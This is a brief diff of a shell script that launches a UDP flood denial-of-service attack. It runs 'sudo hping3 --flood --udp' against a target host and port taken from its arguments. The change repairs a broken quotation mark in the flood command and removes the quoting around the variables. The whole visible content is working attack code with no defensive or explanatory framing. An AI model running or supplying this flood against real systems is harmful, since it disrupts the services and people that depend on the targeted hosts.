@@ -10,4 +10,4 @@ TARGET=$1
 PORT=${2:-80}  #port 80 default if no port specified 
 
 echo "[*] Launching UDP flood on $TARGET:$PORT..."
-sudo hping3 --flood --udp -p "$PORT" -d 1200 "$TARGET
+sudo hping3 --flood --udp -p $PORT -d 1200 $TARGET
